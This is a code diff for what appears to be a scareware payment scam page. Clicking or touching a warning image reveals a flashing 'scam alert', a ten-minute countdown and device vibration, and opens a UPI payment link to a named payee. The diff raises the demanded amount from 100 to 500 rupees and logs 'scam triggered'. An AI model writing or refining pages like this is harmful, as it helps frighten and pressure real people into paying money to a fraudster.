@@ -1,8 +1,15 @@
 window.onload = function () {
   const image = document.getElementById('warningImage');
 
+  if (!image) {
+    console.error("❌ warningImage not found in DOM");
+    return;
+  }
+
+  console.log("✅ warningImage found, click listener ready");
+
   const triggerAlert = () => {
-    console.log("Clicked image");
+    console.log("🛑 scam triggered");
     document.getElementById('warningScreen').classList.add('hidden');
     document.getElementById('scamAlert').classList.remove('hidden');
     document.body.classList.add('flashing');
@@ -17,8 +24,7 @@ window.onload = function () {
 
   image.addEventListener('click', triggerAlert);
   image.addEventListener('touchstart', triggerAlert);
-});
-
+};
 
 function startCountdown() {
   let time = 600;
@@ -39,7 +45,7 @@ function startCountdown() {
 function Payment(app) {
   if ("vibrate" in navigator) navigator.vibrate(200);
 
-  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
+  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=500&cu=INR";
   let upiURL = baseUPI;
 
   if (app === "PayTM") {
@@ -58,4 +64,3 @@ document.addEventListener('keydown', (e) => {
     document.exitFullscreen();
   }
 });
-
